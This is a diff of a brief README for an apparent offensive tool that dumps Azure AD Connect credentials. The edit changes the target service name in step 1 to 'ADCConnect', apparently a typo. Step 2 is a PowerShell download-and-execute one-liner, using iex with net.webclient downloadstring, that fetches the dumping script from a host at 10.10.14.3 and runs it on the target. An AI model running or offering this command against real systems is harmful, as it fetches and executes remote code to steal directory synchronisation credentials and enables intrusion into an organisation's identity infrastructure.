@@ -1,6 +1,6 @@
 # Dump-AADConnect-Credentials
 
-1. Download dump-azureADConnect-creds.ps1 to target running ADSync
+1. Download dump-azureADConnect-creds.ps1 to target running ADCConnect.
 
 2. iex(new-object net.webclient).downloadstring('http://10.10.14.3/dump-azureADConnect-creds.ps1')
 
